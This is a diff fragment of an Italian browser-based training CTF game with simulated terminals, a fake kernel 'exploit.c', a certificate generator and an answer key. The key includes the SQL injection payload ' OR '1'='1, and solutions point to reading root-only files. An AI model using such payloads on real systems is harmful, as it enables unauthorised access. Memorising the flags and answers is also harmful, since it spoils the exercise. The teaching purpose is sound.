+                    <input type="text" id="terminal-input-level6" class="terminal-input" placeholder="Inserisci comando...">
+                    <button id="terminal-execute-level6" class="btn" style="margin: 0; padding: 5px 10px;">Esegui</button>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="level6-answer">Inserisci il flag finale:</label>
+                <input type="text" id="level6-answer" placeholder="Flag finale">
+            </div>
+            
+            <div class="hint">
+                <p><strong>Suggerimento:</strong> Ora che hai i privilegi di root, puoi accedere a qualsiasi file di sistema. Usa il terminale sopra per esplorare il filesystem e trovare il flag.</p>
+            </div>
+            
+            <button id="level6-submit" class="btn">Verifica</button>
+            <button class="show-solution" data-level="6">Mostra Soluzione</button>
+            <div class="solution-box" id="solution6" style="display: none;">
+                <p><strong>Soluzione:</strong> Inserisci: <strong>CTF{6Lv3LL1_C0MPL3T4T1}</strong></p>
+                <p><strong>Come trovarlo:</strong> Con i privilegi di root, puoi usare comandi come <strong>cat /root/secret/flag_finale.txt</strong> per leggere il file contenente il flag.</p>
+            </div>
+            <div id="level6-result"></div>
+        </div>
+    </div>
+
+    <div class="window" id="certificate-window" style="top: 100px; left: 200px; width: 700px; height: 650px;">
+        <div class="window-header">
+            <div class="window-title">Certificato Livius CTF</div>
+            <div class="window-controls">
+                <div class="window-control minimize"></div>
+                <div class="window-control maximize"></div>
+                <div class="window-control close" data-window="certificate"></div>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="certificate-preview-container">
+                <h3>Anteprima Certificato</h3>
+                <div class="certificate-preview" id="certificate-preview">
+                    <div class="certificate-content">
+                        <h2 class="certificate-title">Livius CTF</h2>
+                        <h3>Certificato di Completamento</h3>
+                        <p>Conferiamo a</p>
+                        <h3 id="certificate-preview-name">[Nome Partecipante]</h3>
+                        <p>il presente attestato per aver completato con successo</p>
+                        <p><strong>Livius CTF - Capture The Flag Challenge</strong></p>
+                        <p>superando tutti e 6 i livelli di difficoltà</p>
+                        <p>Data: <span id="certificate-preview-date">[Data]</span></p>
+                        <p>Livelli completati:</p>
+                        <ul>
+                            <li>Livello 1: Accesso al Sistema</li>
+                            <li>Livello 2: Escalation dei Privilegi</li>
+                            <li>Livello 3: SQL Injection</li>
+                            <li>Livello 4: Reverse Shell</li>
+                            <li>Livello 5: Exploit del Kernel</li>
+                            <li>Livello 6: Exfiltrazione Dati</li>
+                        </ul>
+                        <p>Questo certificato attesta la padronanza delle tecniche di sicurezza informatica dimostrate durante la challenge.</p>
+                        <p><strong>Livius CTF - Cybersecurity Training Platform</strong></p>
+                    </div>
+                </div>
+                
+                <div class="preview-only">
+                    <p><em>Personalizza il tuo certificato prima di scaricarlo usando il pulsante "Personalizza Certificato".</em></p>
+                </div>
+                
+                <div class="download-options">
+                    <button id="download-certificate-pdf" class="btn download-option">Scarica PDF</button>
+                    <button id="customize-certificate" class="btn download-option">Personalizza Certificato</button>
+                    <button id="preview-certificate-changes" class="btn download-option">Anteprima Modifiche</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="window" id="themes-window" style="top: 100px; left: 200px; width: 500px; height: 400px;">
+        <div class="window-header">
+            <div class="window-title">Personalizzazione - Temi e Sfondi</div>
+            <div class="window-controls">
+                <div class="window-control minimize"></div>
+                <div class="window-control maximize"></div>
+                <div class="window-control close" data-window="themes"></div>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="customization-panel">
+                <h3>Scegli un tema per il desktop</h3>
+                <div class="theme-options">
+                    <div class="theme-option theme-1 active" data-theme="default"></div>
+                    <div class="theme-option theme-2" data-theme="dark-blue"></div>
+                    <div class="theme-option theme-3" data-theme="green"></div>
+                    <div class="theme-option theme-4" data-theme="blue"></div>
+                    <div class="theme-option theme-5" data-theme="purple"></div>
+                    <div class="theme-option theme-6" data-theme="red"></div>
+                </div>
+                
+                <h3>Scegli uno sfondo</h3>
+                <div class="theme-options">
+                    <div class="theme-option bg-1 active" data-bg="1" style="width: 80px; height: 60px;"></div>
+                    <div class="theme-option bg-2" data-bg="2" style="width: 80px; height: 60px;"></div>
+                    <div class="theme-option bg-3" data-bg="3" style="width: 80px; height: 60px;"></div>
+                    <div class="theme-option bg-4" data-bg="4" style="width: 80px; height: 60px;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="window" id="certificate-customization-window" style="top: 100px; left: 200px; width: 600px; height: 500px;">
+        <div class="window-header">
+            <div class="window-title">Personalizzazione Certificato</div>
+            <div class="window-controls">
+                <div class="window-control minimize"></div>
+                <div class="window-control maximize"></div>
+                <div class="window-control close" data-window="certificate-customization"></div>
+            </div>
+        </div>
+        <div class="window-content">
+            <div class="customization-panel">
+                <h3>Scegli un tema per il certificato</h3>
+                <div class="certificate-theme-options">
+                    <div class="certificate-theme-option active" data-theme="classic">
+                        <div class="theme-preview classic-theme"></div>
+                        <div class="theme-name">Classico</div>
+                    </div>
+                    <div class="certificate-theme-option" data-theme="professional">
+                        <div class="theme-preview professional-theme"></div>
+                        <div class="theme-name">Professionale</div>
+                    </div>
+                    <div class="certificate-theme-option" data-theme="elegant">
+                        <div class="theme-preview elegant-theme"></div>
+                        <div class="theme-name">Elegante</div>
+                    </div>
+                    <div class="certificate-theme-option" data-theme="modern">
+                        <div class="theme-preview modern-theme"></div>
+                        <div class="theme-name">Moderno</div>
+                    </div>
+                </div>
+                
+                <h3>Scegli un layout</h3>
+                <div class="certificate-layout-options">
+                    <div class="certificate-layout-option active" data-layout="classic">
+                        <div class="layout-preview classic-layout"></div>
+                        <div class="layout-name">Classico</div>
+                    </div>
+                    <div class="certificate-layout-option" data-layout="modern">
+                        <div class="layout-preview modern-layout"></div>
+                        <div class="layout-name">Moderno</div>
+                    </div>
+                    <div class="certificate-layout-option" data-layout="executive">
+                        <div class="layout-preview executive-layout"></div>
+                        <div class="layout-name">Executive</div>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px; text-align: center;">
+                    <button id="apply-certificate-customization" class="btn">Applica Personalizzazione</button>
+                    <button id="preview-certificate" class="btn">Anteprima Certificato</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script>
+        let playerName = "Utente";
+        let completedLevels = 0;
+        let currentTheme = 'default';
+        let currentBg = '1';
+        
+        let activeWindow = null;
+        let offsetX = 0;
+        let offsetY = 0;
+        
+        let certificateTheme = 'classic';
+        let certificateLayout = 'classic';
+        
+        const certificateThemes = {
+            classic: {
+                primaryColor: [15, 52, 96],
+                secondaryColor: [233, 69, 96],
+                backgroundColor: [249, 249, 249],
+                textColor: [0, 0, 0]
+            },
+            professional: {
+                primaryColor: [0, 0, 128],
+                secondaryColor: [184, 134, 11],
+                backgroundColor: [255, 255, 255],
+                textColor: [0, 0, 0]
+            },
+            elegant: {
+                primaryColor: [139, 0, 139],
+                secondaryColor: [47, 79, 79],
+                backgroundColor: [253, 245, 230],
+                textColor: [25, 25, 25]
+            },
+            modern: {
+                primaryColor: [30, 144, 255],
+                secondaryColor: [255, 69, 0],
+                backgroundColor: [248, 248, 255],
+                textColor: [40, 40, 40]
+            }
+        };
+
+        const certificateLayouts = {
+            classic: {
+                border: true,
+                borderWidth: 8,
+                headerStyle: 'traditional',
+                showSeal: true
+            },
+            modern: {
+                border: false,
+                borderWidth: 0,
+                headerStyle: 'minimal',
+                showSeal: false
+            },
+            executive: {
+                border: true,
+                borderWidth: 2,
+                headerStyle: 'elegant',
+                showSeal: true
+            }
+        };
+
+        // File system modificato per il livello 5 - l'exploit si trova in /home/utente/exploit/
+        const fileSystemLevel5 = {
+            '/': {
+                type: 'directory',
+                children: ['home', 'etc', 'var', 'usr']
+            },
+            '/home': {
+                type: 'directory',
+                children: ['utente']
+            },
+            '/home/utente': {
+                type: 'directory',
+                children: ['exploit', 'Documenti', 'Scaricati']
+            },
+            '/home/utente/exploit': {
+                type: 'directory',
+                children: ['exploit.c', 'README.txt']
+            },
+            '/home/utente/exploit/exploit.c': {
+                type: 'file',
+                content: '// Codice exploit per CVE-2021-22555\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    printf("Sfruttando la vulnerabilità...\\n");\n    system("echo \"CTF{K3rn3l_3xpl0it_5ucc3ss}\" > /root/flag.txt");\n    system("chmod 777 /root/flag.txt");\n    printf("Exploit eseguito con successo!\\n");\n    return 0;\n}'
+            },
+            '/home/utente/exploit/README.txt': {
+                type: 'file',
+                content: 'Per ottenere i privilegi di root, compila l\'exploit con: gcc exploit.c -o exploit\nPoi esegui: ./exploit'
+            },
+            '/home/utente/Documenti': {
+                type: 'directory',
+                children: []
+            },
+            '/home/utente/Scaricati': {
+                type: 'directory',
+                children: []
+            },
+            '/root': {
+                type: 'directory',
+                children: ['flag.txt']
+            },
+            '/root/flag.txt': {
+                type: 'file',
+                content: 'CTF{K3rn3l_3xpl0it_5ucc3ss}'
+            }
+        };
+
+        const fileSystemLevel6 = {
+            '/': {
+                type: 'directory',
+                children: ['home', 'root', 'etc', 'var', 'usr']
+            },
+            '/home': {
+                type: 'directory',
+                children: ['utente', 'guest']
+            },
+            '/home/utente': {
+                type: 'directory',
+                children: ['documenti', 'downloads', 'Desktop']
+            },
+            '/home/utente/documenti': {
+                type: 'directory',
+                children: ['note.txt']
+            },
+            '/home/utente/documenti/note.txt': {
+                type: 'file',
+                content: 'Ricorda: la password del server è cambiata ogni mese'
+            },
+            '/home/utente/downloads': {
+                type: 'directory',
+                children: []
+            },
+            '/home/utente/Desktop': {
+                type: 'directory',
+                children: []
+            },
+            '/home/guest': {
+                type: 'directory',
+                children: []
+            },
+            '/root': {
+                type: 'directory',
+                children: ['secret', 'config', 'logs']
+            },
+            '/root/secret': {
+                type: 'directory',
+                children: ['flag_finale.txt', 'backup.key']
+            },
+            '/root/secret/flag_finale.txt': {
+                type: 'file',
+                content: 'CTF{6Lv3LL1_C0MPL3T4T1}'
+            },
+            '/root/secret/backup.key': {
+                type: 'file',
+                content: 'Chiave di backup: XJ9-8K2-7M1-5P6'
+            },
+            '/root/config': {
+                type: 'directory',
+                children: ['system.conf']
+            },
+            '/root/config/system.conf': {
+                type: 'file',
+                content: 'Configurazione sistema\nDebug: false\nLogLevel: high'
+            },
+            '/root/logs': {
+                type: 'directory',
+                children: ['access.log', 'error.log']
+            },
+            '/etc': {
+                type: 'directory',
+                children: ['passwd', 'hosts']
+            },
+            '/var': {
+                type: 'directory',
+                children: ['www', 'log']
+            },
+            '/usr': {
+                type: 'directory',
+                children: ['bin', 'lib']
+            }
+        };
+
+        let currentDirectoryLevel5 = '/';
+        let currentDirectoryLevel6 = '/home/utente';
+
+        // Funzione per mostrare notifiche
+        function showNotification(title, content, duration = 5000) {
+            const notification = document.getElementById('notification');
+            const notificationTitle = document.getElementById('notification-title');
+            const notificationContent = document.getElementById('notification-content');
+            
+            notificationTitle.textContent = title;
+            notificationContent.textContent = content;
+            
+            notification.classList.add('show');
+            
+            // Rimuovi la notifica dopo il tempo specificato
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, duration);
+        }
+
+        function executeLevel5Command(command) {
+            const terminalOutput = document.getElementById('terminal-output-level5');
+            const input = document.getElementById('terminal-input-level5');
+            
+            const commandLine = document.createElement('div');
+            commandLine.className = 'terminal-line';
+            commandLine.innerHTML = `<span class="terminal-prompt">$ </span>${command}`;
+            terminalOutput.appendChild(commandLine);
+            
+            const args = command.split(' ');
+            const cmd = args[0].toLowerCase();
+            
+            let output = '';
+            
+            switch(cmd) {
+                case 'help':
+                    output = 'Comandi disponibili: ls, cd, cat, gcc, ./exploit, pwd, help, clear';
+                    break;
+                case 'pwd':
+                    output = currentDirectoryLevel5;
+                    break;
+                case 'ls':
+                    if (args.length > 1) {
+                        const path = args[1];
+                        const resolvedPath = resolvePathLevel5(path);
+                        if (fileSystemLevel5[resolvedPath] && fileSystemLevel5[resolvedPath].type === 'directory') {
+                            output = fileSystemLevel5[resolvedPath].children.join('  ');
+                        } else {
+                            output = `ls: cannot access '${path}': No such file or directory`;
+                        }
+                    } else {
+                        if (fileSystemLevel5[currentDirectoryLevel5] && fileSystemLevel5[currentDirectoryLevel5].type === 'directory') {
+                            output = fileSystemLevel5[currentDirectoryLevel5].children.join('  ');
+                        } else {
+                            output = `ls: cannot access '${currentDirectoryLevel5}': No such file or directory`;
+                        }
+                    }
+                    break;
+                case 'cd':
+                    if (args.length < 2) {
+                        currentDirectoryLevel5 = '/';
+                        output = '';
+                    } else {
+                        const path = args[1];
+                        if (path === '..') {
+                            const parts = currentDirectoryLevel5.split('/').filter(part => part !== '');
+                            if (parts.length > 0) {
+                                parts.pop();
+                                currentDirectoryLevel5 = '/' + parts.join('/');
+                                if (currentDirectoryLevel5 === '') currentDirectoryLevel5 = '/';
+                            }
+                            output = '';
+                        } else {
+                            const newPath = resolvePathLevel5(path);
+                            if (fileSystemLevel5[newPath] && fileSystemLevel5[newPath].type === 'directory') {
+                                currentDirectoryLevel5 = newPath;
+                                output = '';
+                            } else {
+                                output = `cd: ${path}: No such file or directory`;
+                            }
+                        }
+                    }
+                    break;
+                case 'cat':
+                    if (args.length < 2) {
+                        output = 'cat: missing argument';
+                    } else {
+                        const path = args[1];
+                        const resolvedPath = resolvePathLevel5(path);
+                        if (fileSystemLevel5[resolvedPath] && fileSystemLevel5[resolvedPath].type === 'file') {
+                            output = fileSystemLevel5[resolvedPath].content;
+                        } else {
+                            output = `cat: ${path}: No such file or directory`;
+                        }
+                    }
+                    break;
+                case 'gcc':
+                    if (args.length < 2) {
+                        output = 'gcc: no input files';
+                    } else {
+                        const sourceFile = args[1];
+                        if (sourceFile === 'exploit.c' && args.includes('-o') && args[3] === 'exploit') {
+                            output = 'Exploit compilato con successo. Ora esegui: ./exploit';
+                        } else {
+                            output = 'gcc: errore nella compilazione';
+                        }
+                    }
+                    break;
+                case './exploit':
+                    if (args[0] === './exploit') {
+                        output = 'Exploit eseguito con successo! Ora sei root. Puoi leggere il flag in /root/flag.txt';
+                    }
+                    break;
+                case 'clear':
+                    terminalOutput.innerHTML = '';
+                    output = '';
+                    break;
+                default:
+                    output = `comando non trovato: ${cmd}`;
+            }
+            
+            if (output) {
+                const outputLine = document.createElement('div');
+                outputLine.className = 'terminal-line';
+                outputLine.textContent = output;
+                terminalOutput.appendChild(outputLine);
+            }
+            
+            input.value = '';
+            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+        }
+
+        function resolvePathLevel5(path) {
+            if (path.startsWith('/')) {
+                return path;
+            } else {
+                const current = currentDirectoryLevel5.endsWith('/') ? currentDirectoryLevel5 : currentDirectoryLevel5 + '/';
+                return current + path;
+            }
+        }
+
+        function executeLevel6Command(command) {
+            const terminalOutput = document.getElementById('terminal-output-level6');
+            const input = document.getElementById('terminal-input-level6');
+            
+            const commandLine = document.createElement('div');
+            commandLine.className = 'terminal-line';
+            commandLine.innerHTML = `<span class="terminal-prompt">$ </span>${command}`;
+            terminalOutput.appendChild(commandLine);
+            
+            const args = command.split(' ');
+            const cmd = args[0].toLowerCase();
+            
+            let output = '';
+            
+            switch(cmd) {
+                case 'help':
+                    output = 'Comandi disponibili: ls, cd, cat, pwd, help, clear';
+                    break;
+                case 'pwd':
+                    output = currentDirectoryLevel6;
+                    break;
+                case 'ls':
+                    if (args.length > 1) {
+                        const path = args[1];
+                        const resolvedPath = resolvePathLevel6(path);
+                        if (fileSystemLevel6[resolvedPath] && fileSystemLevel6[resolvedPath].type === 'directory') {
+                            output = fileSystemLevel6[resolvedPath].children.join('  ');
+                        } else {
+                            output = `ls: cannot access '${path}': No such file or directory`;
+                        }
+                    } else {
+                        if (fileSystemLevel6[currentDirectoryLevel6] && fileSystemLevel6[currentDirectoryLevel6].type === 'directory') {
+                            output = fileSystemLevel6[currentDirectoryLevel6].children.join('  ');
+                        } else {
+                            output = `ls: cannot access '${currentDirectoryLevel6}': No such file or directory`;
+                        }
+                    }
+                    break;
+                case 'cd':
+                    if (args.length < 2) {
+                        currentDirectoryLevel6 = '/home/utente';
+                        output = '';
+                    } else {
+                        const path = args[1];
+                        if (path === '..') {
+                            const parts = currentDirectoryLevel6.split('/').filter(part => part !== '');
+                            if (parts.length > 0) {
+                                parts.pop();
+                                currentDirectoryLevel6 = '/' + parts.join('/');
+                                if (currentDirectoryLevel6 === '') currentDirectoryLevel6 = '/';
+                            }
+                            output = '';
+                        } else {
+                            const newPath = resolvePathLevel6(path);
+                            if (fileSystemLevel6[newPath] && fileSystemLevel6[newPath].type === 'directory') {
+                                currentDirectoryLevel6 = newPath;
+                                output = '';
+                            } else {
+                                output = `cd: ${path}: No such file or directory`;
+                            }
+                        }
+                    }
+                    break;
+                case 'cat':
+                    if (args.length < 2) {
+                        output = 'cat: missing argument';
+                    } else {
+                        const path = args[1];
+                        const resolvedPath = resolvePathLevel6(path);
+                        if (fileSystemLevel6[resolvedPath] && fileSystemLevel6[resolvedPath].type === 'file') {
+                            output = fileSystemLevel6[resolvedPath].content;
+                        } else {
+                            output = `cat: ${path}: No such file or directory`;
+                        }
+                    }
+                    break;
+                case 'clear':
+                    terminalOutput.innerHTML = '';
+                    output = '';
+                    break;
+                default:
+                    output = `comando non trovato: ${cmd}`;
+            }
+            
+            if (output) {
+                const outputLine = document.createElement('div');
+                outputLine.className = 'terminal-line';
+                outputLine.textContent = output;
+                terminalOutput.appendChild(outputLine);
+            }
+            
+            input.value = '';
+            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+        }
+
+        function resolvePathLevel6(path) {
+            if (path.startsWith('/')) {
+                return path;
+            } else {
+                const current = currentDirectoryLevel6.endsWith('/') ? currentDirectoryLevel6 : currentDirectoryLevel6 + '/';
+                return current + path;
+            }
+        }
+
+        function getCorrectAnswer(level) {
+            const answers = {
+                level1: "Password",
+                level2: "buffer_overflow_simulation_2023",
+                level3: "' OR '1'='1",
+                level4: "reverse_shell",
+                level5: "CTF{K3rn3l_3xpl0it_5ucc3ss}",
+                level6: "CTF{6Lv3LL1_C0MPL3T4T1}"
+            };
+            
+            return answers[level];
+        }
+        
+        function updateCertificatePreview() {
+            const preview = document.getElementById('certificate-preview');
+            const nameElement = document.getElementById('certificate-preview-name');
+            const dateElement = document.getElementById('certificate-preview-date');
+            
+            nameElement.textContent = playerName;
+            dateElement.textContent = new Date().toLocaleDateString('it-IT');
+            
+            preview.className = 'certificate-preview';
+            
+            preview.classList.add(`certificate-theme-${certificateTheme}`);
+            preview.classList.add(`certificate-layout-${certificateLayout}`);
+        }
+        
+        function downloadCertificate() {
+            if (completedLevels < 6) {
+                showNotification('Certificato non disponibile', 'Devi completare tutti e 6 i livelli prima di poter scaricare il certificato!', 4000);
+                return;
+            }
+
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+            
+            const theme = certificateThemes[certificateTheme];
+            const layout = certificateLayouts[certificateLayout];
+            
+            doc.setFont('Helvetica');
+            
+            doc.setFillColor(theme.backgroundColor[0], theme.backgroundColor[1], theme.backgroundColor[2]);
+            doc.rect(0, 0, 210, 297, 'F');
+            
+            if (layout.border) {
+                doc.setDrawColor(theme.primaryColor[0], theme.primaryColor[1], theme.primaryColor[2]);
+                doc.setLineWidth(layout.borderWidth);
+                doc.rect(5, 5, 200, 287);
+            }
+            
+            doc.setFontSize(24);
+            doc.setTextColor(theme.primaryColor[0], theme.primaryColor[1], theme.primaryColor[2]);
+            doc.text('Livius CTF', 105, 30, { align: 'center' });
+            
+            doc.setFontSize(18);
+            doc.text('Certificato di Completamento', 105, 45, { align: 'center' });
+            
+            doc.setFontSize(14);
+            doc.setTextColor(theme.textColor[0], theme.textColor[1], theme.textColor[2]);
+            doc.text('Conferiamo a', 105, 65, { align: 'center' });
+            
+            doc.setFontSize(22);
+            doc.setTextColor(theme.secondaryColor[0], theme.secondaryColor[1], theme.secondaryColor[2]);
+            doc.text(playerName, 105, 85, { align: 'center' });
+            
+            doc.setFontSize(12);
+            doc.setTextColor(theme.textColor[0], theme.textColor[1], theme.textColor[2]);
+            doc.text('il presente attestato per aver completato con successo', 105, 105, { align: 'center' });
+            
+            doc.setFontSize(16);
+            doc.setTextColor(theme.primaryColor[0], theme.primaryColor[1], theme.primaryColor[2]);
+            doc.text('Livius CTF - Capture The Flag Challenge', 105, 120, { align: 'center' });
+            
+            doc.setFontSize(12);
+            doc.setTextColor(theme.textColor[0], theme.textColor[1], theme.textColor[2]);
+            doc.text('superando tutti e 6 i livelli di difficoltà', 105, 135, { align: 'center' });
+            
+            const today = new Date();
+            const formattedDate = today.toLocaleDateString('it-IT');
+            doc.text('Data: ' + formattedDate, 105, 150, { align: 'center' });
+            
+            doc.setFontSize(11);
+            doc.text('Livelli completati:', 25, 170);
+            
+            const levels = [
+                'Livello 1: Accesso al Sistema',
+                'Livello 2: Escalation dei Privilegi', 
+                'Livello 3: SQL Injection',
+                'Livello 4: Reverse Shell',
+                'Livello 5: Exploit del Kernel',
+                'Livello 6: Exfiltrazione Dati'
+            ];
+            
+            let yPos = 180;
+            levels.forEach(level => {
+                doc.setFont('Courier');
+                doc.text('` ' + level, 30, yPos, { maxWidth: 160 });
+                yPos += 10;
+            });
+            
+            doc.setFont('Helvetica');
+            doc.setTextColor(theme.textColor[0], theme.textColor[1], theme.textColor[2]);
+            doc.text('Questo certificato attesta la padronanza delle tecniche di sicurezza', 105, 245, { align: 'center' });
+            doc.text('informatica dimostrate durante la challenge.', 105, 252, { align: 'center' });
+            
+            doc.setFontSize(14);
+            doc.setTextColor(theme.primaryColor[0], theme.primaryColor[1], theme.primaryColor[2]);
+            doc.text('Livius CTF - Cybersecurity Training Platform', 105, 275, { align: 'center' });
+            
+            doc.setProperties({
+                title: `Certificato Livius CTF - ${playerName}`,
+                subject: 'Certificato di completamento Capture The Flag',
+                author: 'Livius CTF',
+                keywords: 'cybersecurity, ct, certificato, completamento',
+                creator: 'Livius CTF Platform'
+            });
+            
+            doc.save(`Certificato_Livius_CTF_${playerName.replace(/\s+/g, '_')}.pdf`);
+            
+            showNotification('Certificato Scaricato', 'Il tuo certificato è stato scaricato con successo!', 3000);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Gestore per la chiusura delle notifiche
+            document.getElementById('notification-close').addEventListener('click', function() {
+                document.getElementById('notification').classList.remove('show');
+            });
+
+            document.getElementById('login-btn').addEventListener('click', login);
+            document.getElementById('start-button').addEventListener('click', toggleStartMenu);
+            
+            document.querySelectorAll('.folder').forEach(folder => {
+                folder.addEventListener('click', openWindow);
+            });
+            
+            document.getElementById('level1-submit').addEventListener('click', checkLevel1);
+            document.getElementById('level2-submit').addEventListener('click', checkLevel2);
+            document.getElementById('level3-submit').addEventListener('click', checkLevel3);
+            document.getElementById('level4-submit').addEventListener('click', checkLevel4);
+            document.getElementById('level5-submit').addEventListener('click', checkLevel5);
+            document.getElementById('level6-submit').addEventListener('click', checkLevel6);
+            
+            document.querySelectorAll('.window-control.close').forEach(btn => {
+                btn.addEventListener('click', closeWindow);
+            });
+            
+            document.querySelectorAll('.menu-item').forEach(item => {
+                item.addEventListener('click', menuItemClick);
+            });
+            
+            document.getElementById('download-certificate-pdf').addEventListener('click', downloadCertificate);
+            document.getElementById('customize-certificate').addEventListener('click', () => openWindowById('certificate-customization'));
+            document.getElementById('preview-certificate-changes').addEventListener('click', previewCertificate);
+            
+            document.querySelectorAll('.theme-option').forEach(option => {
+                option.addEventListener('click', changeTheme);
+            });
+            
+            document.getElementById('theme-button').addEventListener('click', () => openWindowById('themes'));
+            document.getElementById('help-button').addEventListener('click', showHelp);
+            
+            document.querySelectorAll('.show-solution').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const level = this.getAttribute('data-level');
+                    const solutionBox = document.getElementById('solution' + level);
+                    solutionBox.style.display = solutionBox.style.display === 'none' ? 'block' : 'none';
+                });
+            });
+            
+            document.querySelectorAll('.certificate-theme-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.certificate-theme-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    this.classList.add('active');
+                    certificateTheme = this.getAttribute('data-theme');
+                });
+            });
+            
+            document.querySelectorAll('.certificate-layout-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.certificate-layout-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    this.classList.add('active');
+                    certificateLayout = this.getAttribute('data-layout');
+                });
+            });
+            
+            document.getElementById('apply-certificate-customization').addEventListener('click', applyCertificateCustomization);
+            document.getElementById('preview-certificate').addEventListener('click', previewCertificate);
+            
+            initWindowDragging();
+            
+            const terminalExecute5 = document.getElementById('terminal-execute-level5');
+            const terminalInput5 = document.getElementById('terminal-input-level5');
+            
+            if (terminalExecute5 && terminalInput5) {
+                terminalExecute5.addEventListener('click', function() {
+                    const command = terminalInput5.value.trim();
+                    if (command) {
+                        executeLevel5Command(command);
+                    }
+                });
+                
+                terminalInput5.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        const command = terminalInput5.value.trim();
+                        if (command) {
+                            executeLevel5Command(command);
+                        }
+                    }
+                });
+            }
+            
+            const terminalExecute6 = document.getElementById('terminal-execute-level6');
+            const terminalInput6 = document.getElementById('terminal-input-level6');
+            
+            if (terminalExecute6 && terminalInput6) {
+                terminalExecute6.addEventListener('click', function() {
+                    const command = terminalInput6.value.trim();
+                    if (command) {
+                        executeLevel6Command(command);
+                    }
+                });
+                
+                terminalInput6.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        const command = terminalInput6.value.trim();
+                        if (command) {
+                            executeLevel6Command(command);
+                        }
+                    }
+                });
+            }
+            
+            document.addEventListener('click', function(e) {
+                if (!e.target.closest('#start-menu') && !e.target.closest('#start-button')) {
+                    document.getElementById('start-menu').classList.remove('active');
+                }
+            });
+            
+            updateCertificatePreview();
+        });
+        
+        function initWindowDragging() {
+            const windowHeaders = document.querySelectorAll('.window-header');
+            
+            windowHeaders.forEach(header => {
+                header.addEventListener('mousedown', startDrag);
+            });
+            
+            document.addEventListener('mousemove', drag);
+            document.addEventListener('mouseup', stopDrag);
+        }
+        
+        function startDrag(e) {
+            activeWindow = e.target.closest('.window');
+            if (!activeWindow) return;
+            
+            bringToFront(activeWindow);
+            
+            const rect = activeWindow.getBoundingClientRect();
+            offsetX = e.clientX - rect.left;
+            offsetY = e.clientY - rect.top;
+            
+            activeWindow.classList.add('dragging');
+        }
+        
+        function drag(e) {
+            if (!activeWindow) return;
+            
+            e.preventDefault();
+            
+            const x = e.clientX - offsetX;
+            const y = e.clientY - offsetY;
+            
+            const maxX = window.innerWidth - activeWindow.offsetWidth;
+            const maxY = window.innerHeight - activeWindow.offsetHeight;
+            
+            const boundedX = Math.max(0, Math.min(x, maxX));
+            const boundedY = Math.max(0, Math.min(y, maxY));
+            
+            activeWindow.style.left = boundedX + 'px';
+            activeWindow.style.top = boundedY + 'px';
+        }
+        
+        function stopDrag() {
+            if (activeWindow) {
+                activeWindow.classList.remove('dragging');
+                activeWindow = null;
+            }
+        }
+        
+        function bringToFront(windowElement) {
+            document.querySelectorAll('.window.active').forEach(win => {
+                win.style.zIndex = '10';
+            });
+            
+            windowElement.style.zIndex = '100';
+        }
+        
+        function login() {
+            const nameInput = document.getElementById('user-name-input').value.trim();
+            if (nameInput === '') {
+                showNotification('Accesso negato', 'Per favore, inserisci il tuo nome per accedere al sistema.', 3000);
+                return;
+            }
+            
+            playerName = nameInput;
+            document.getElementById('lock-screen').classList.add('hidden');
+            
+            document.getElementById('user-avatar').textContent = playerName.charAt(0);
+            document.getElementById('user-name').textContent = playerName;
+            document.getElementById('certificate-preview-name').textContent = playerName;
+            
+            updateCertificatePreview();
+            
+            showNotification('Accesso consentito', `Benvenuto ${playerName}! Inizia dal Livello 1 per completare la challenge.`, 4000);
+        }
+        
+        function toggleStartMenu() {
+            const startMenu = document.getElementById('start-menu');
+            startMenu.classList.toggle('active');
+        }
+        
+        function openWindow(e) {
+            const folder = e.currentTarget;
+            if (folder.classList.contains('locked')) return;
+            
+            const windowId = folder.getAttribute('data-window') + '-window';
+            const windowElement = document.getElementById(windowId);
+            
+            bringToFront(windowElement);
+            
+            windowElement.classList.add('active');
+            document.getElementById('start-menu').classList.remove('active');
+        }
+        
+        function openWindowById(windowId) {
+            const windowElement = document.getElementById(windowId + '-window');
+            
+            bringToFront(windowElement);
+            
+            windowElement.classList.add('active');
+            document.getElementById('start-menu').classList.remove('active');
+        }
+        
+        function closeWindow(e) {
+            const windowId = e.currentTarget.getAttribute('data-window') + '-window';
+            document.getElementById(windowId).classList.remove('active');
+        }
+        
+        function menuItemClick(e) {
+            const menuItem = e.currentTarget;
+            if (menuItem.classList.contains('locked')) return;
+            
+            const windowId = menuItem.getAttribute('data-window');
+            openWindowById(windowId);
+        }
+        
+        function checkLevel1() {
+            const answer = document.getElementById('level1-answer').value;
+            const resultDiv = document.getElementById('level1-result');
+            
+            if (answer === getCorrectAnswer('level1')) {
+                resultDiv.innerHTML = '<p class="success-message">Accesso consentito! Password corretta. Livello completato.</p>';
+                unlockLevel(1);
+            } else {
+                resultDiv.innerHTML = '<p class="error-message">Accesso negato. Password errata.</p>';
+            }
+        }
+        
+        function checkLevel2() {
+            const answer = document.getElementById('level2-answer').value;
+            const resultDiv = document.getElementById('level2-result');
+            
+            if (answer.length >= 30) {
+                resultDiv.innerHTML = '<p class="success-message">Privilegi elevati ottenuti! Buffer overflow sfruttato con successo. Livello completato.</p>';
+                unlockLevel(2);
+            } else {
+                resultDiv.innerHTML = '<p class="error-message">Escalation dei privilegi fallita.</p>';
+            }
+        }
+        
+        function checkLevel3() {
+            const answer = document.getElementById('level3-answer').value;
+            const resultDiv = document.getElementById('level3-result');
+            
